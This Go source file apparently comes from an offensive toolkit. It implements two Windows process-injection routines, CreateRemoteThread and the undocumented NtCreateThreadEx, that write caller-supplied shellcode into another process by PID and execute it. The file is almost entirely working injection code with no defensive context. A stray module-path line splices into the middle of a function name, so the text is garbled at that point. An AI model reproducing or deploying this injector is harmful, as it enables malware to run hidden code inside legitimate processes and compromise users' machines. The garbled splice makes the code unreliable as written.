package injection

import (
	"fmt"
	"unsafe"
)

type CreateRemoteThreadInjector struct {
	BaseInjector
}

func NewCreateRemoteThreadInjector() *CreateRemoteThreadInjector {
	return &CreateRemoteThreadInjector{
		BaseInjector: BaseInjector{
			name:        "CreateRemoteThread",
			description: "Classic process injection using CreateRemoteThread API",
		},
	}
}

func (i *CreateRemoteThreadInjector) Inject(pid int, shellcode []byte) error {
	
	if err := ValidateShellcode(shellcode); err != nil {
		return err
	}

	
	if !IsProcessRunning(pid) {
		return fmt.Errorf("process with PID %d is not running", pid)
	}

	
	hProcess, err := OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, false, DWORD(pid))
	if err != nil {
		return fmt.Errorf("failed to open process: %v", err)
	}
	defer CloseHandle(hProcess)

	
	addr, err := VirtualAllocEx(hProcess, 0, SIZE_T(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		return fmt.Errorf("failed to allocate memory: %v", err)
	}

	
	err = WriteProcessMemory(hProcess, addr, shellcode, SIZE_T(len(shellcode)))
	if err != nil {
		
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to write shellcode: %v", err)
	}

	
	_, err = VirtualProtectEx(hProcess, addr, SIZE_T(len(shellcode)), PAGE_EXECUTE_READ)
	if err != nil {
		
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to change memory protection: %v", err)
	}

	
	hThread, err := CreateRemoteThread(hProcess, 0, 0, addr, 0, 0)
	if err != nil {
		
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to create remote thread: %v", err)
	}
	defer CloseHandle(hThread)

	
	WaitForSingleObject(hThread, INFINITE)

	
	exitCode, err := GetExitCodeThread(hThread)
	if err != nil {
		return fmt.Errorf("failed to get thread exit code: %v", err)
	}

	if exitCode != 0 {
		return fmt.Errorf("thread exited with code %d", exitCode)
	}

	return nil
}

type NtCreateThreadExInjector struct {
	BaseInjector
}

func NewNtCreateTh	module "project/src/core/module"
readExInjector() *NtCreateThreadExInjector {
	return &NtCreateThreadExInjector{
		BaseInjector: BaseInjector{
			name:        "NtCreateThreadEx",
			description: "Process injection using the undocumented NtCreateThreadEx API",
		},
	}
}

func (i *NtCreateThreadExInjector) Inject(pid int, shellcode []byte) error {
	
	if err := ValidateShellcode(shellcode); err != nil {
		return err
	}

	
	if !IsProcessRunning(pid) {
		return fmt.Errorf("process with PID %d is not running", pid)
	}

	
	hProcess, err := OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, false, DWORD(pid))
	if err != nil {
		return fmt.Errorf("failed to open process: %v", err)
	}
	defer CloseHandle(hProcess)

	
	addr, err := VirtualAllocEx(hProcess, 0, SIZE_T(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		return fmt.Errorf("failed to allocate memory: %v", err)
	}

	
	err = WriteProcessMemory(hProcess, addr, shellcode, SIZE_T(len(shellcode)))
	if err != nil {
		
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to write shellcode: %v", err)
	}

	
	_, err = VirtualProtectEx(hProcess, addr, SIZE_T(len(shellcode)), PAGE_EXECUTE_READ)
	if err != nil {
		
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to change memory protection: %v", err)
	}

	
	var hThread HANDLE
	status, _, _ := ntCreateThreadEx.Call(
		uintptr(unsafe.Pointer(&hThread)),
		uintptr(PROCESS_ALL_ACCESS),
		uintptr(0),
		uintptr(hProcess),
		uintptr(addr),
		uintptr(0),
		uintptr(0),
		uintptr(0),
		uintptr(0),
		uintptr(0),
		uintptr(0),
	)

	if status != 0 {
		
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		return fmt.Errorf("NtCreateThreadEx failed with status: 0x%x", status)
	}
	defer CloseHandle(hThread)

	
	WaitForSingleObject(hThread, INFINITE)

	
	exitCode, err := GetExitCodeThread(hThread)
	if err != nil {
		return fmt.Errorf("failed to get thread exit code: %v", err)
	}

	if exitCode != 0 {
		return fmt.Errorf("thread exited with code %d", exitCode)
	}

	return nil
}
